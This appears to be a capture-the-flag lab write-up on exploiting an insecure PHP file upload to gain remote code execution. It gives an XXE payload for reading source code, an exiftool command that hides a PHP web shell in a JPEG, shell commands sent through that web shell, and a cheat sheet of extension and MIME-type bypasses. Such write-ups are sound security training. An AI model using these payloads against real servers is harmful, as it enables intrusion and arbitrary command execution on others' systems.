## **Step-by-Step Walkthrough**

## **Step 1: Identifying the File Upload Mechanism**
- Uploaded a simple `test.php` file to the upload form and observed the response.
- Noticed the application rejected `.php` but accepted files with extensions like `.phar.jpg`.
- Determined that the upload form checks both **file extension** and **MIME type**.

## **Step 2: Discovering the Upload Directory**
- Examined page source and found references to `submit.php`.
- Discovered `script.js` containing more information, including `upload.php`.
- Navigated to `upload.php`, but it didn’t reveal anything directly.

## **Step 3: Using XXE to Extract `upload.php` Source Code**
- Exploited an **XML External Entity (XXE)** vulnerability to extract `upload.php`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
  <svg>&xxe;</svg>
  ```
- Intercepted the request in **Burp Suite**, modified the file validation logic, and uploaded the `.svg` file.
- Received a **base64-encoded** response, which was decoded using **CyberChef**.
- Learned:
  - Where files are stored.
  - How files are renamed (`YMD_filename` format).
  - That the system used **MIME-Type validation**.

## **Step 4: Bypassing MIME-Type Validation**
- Attempted to upload a **JPEG file with a PHP payload**, but the system detected the payload.
- Realized the application used **`mime_content_type()`**, which checks actual file content, not just the extension.
- Instead of using a fake extension, created a **legitimate JPEG file** and embedded the PHP payload using `exiftool`.

## **Step 5: Crafting the Malicious Payload**
1. Created a blank 100x100 white image:
   ```bash
   convert -size 100x100 xc:white image.jpg
   ```
2. Embedded the PHP payload inside the image metadata:
   ```bash
   exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' image.jpg -o shell.phar.jpg
   ```
3. Uploaded the `shell.phar.jpg` file.

## **Step 6: Exploiting the Uploaded Web Shell**
- Navigated to the correct upload directory based on previous findings:
  ```bash
  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=id
  ```
- Verified code execution by running `id`.

## **Step 7: Finding and Reading the Flag**
- Searched for flag files:
  ```bash
  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=find / -name flag*.txt
  ```
- Located the flag file and retrieved its contents:
  ```bash
  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
  ```

---

## **Summary**
You exploited an insecure file upload by bypassing file extension restrictions, MIME-type validation, and leveraging an XXE vulnerability to gather insights about the server. Using this knowledge, you embedded a PHP web shell inside a valid JPEG file and executed commands remotely to locate and read the flag.

---

### **Key Takeaways**
- **File upload security is often weak**—restrictions on extensions alone are insufficient.
- **MIME-Type validation can be bypassed** by ensuring the file header matches the expected format.
- **XXE vulnerabilities** can be leveraged to read source code, revealing how files are handled.
- **Exploiting metadata** (e.g., `exiftool`) is an effective method to bypass image validation checks.
- **Identifying the upload directory** is crucial for accessing your uploaded malicious file.
- **Understanding file renaming patterns** helps in constructing the correct request.

---

### **Things to Remember for Future Tests**
1. **File Extension Bypass**
   - Try `.phar`, `.phar.jpg`, `.php5`, `.phtml`, `.php.jpg`, etc.

2. **MIME-Type Validation Bypass**
   - Ensure the file header matches the expected format.
   - Use **exiftool** to embed payloads inside images.

3. **Finding the Upload Directory**
   - Check **page source, JavaScript files, and API calls**.
   - Use **XXE, LFI, or directory brute-forcing** if needed.

4. **Code Execution**
   - Use a **web shell** (e.g., `system($_GET['cmd']);`).
   - Test execution with simple commands like `id` or `whoami`.

5. **Post-Exploitation**
   - **Find flag files** with `find / -name flag*.txt`.
   - **Read them** using `cat`.

By systematically approaching file upload vulnerabilities, you can effectively escalate them into full **remote code execution (RCE)**. 🚀
